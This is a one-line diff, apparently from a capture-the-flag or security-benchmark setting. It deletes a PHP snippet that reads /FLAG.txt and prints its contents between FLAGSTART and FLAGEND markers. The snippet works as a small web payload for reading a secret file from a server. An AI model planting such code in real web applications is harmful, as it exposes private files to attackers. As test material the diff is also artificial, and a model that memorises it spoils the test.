@@ -1,1 +1,0 @@
-<?php echo "FLAGSTART"; readfile("/FLAG.txt"); echo "FLAGEND"; ?>
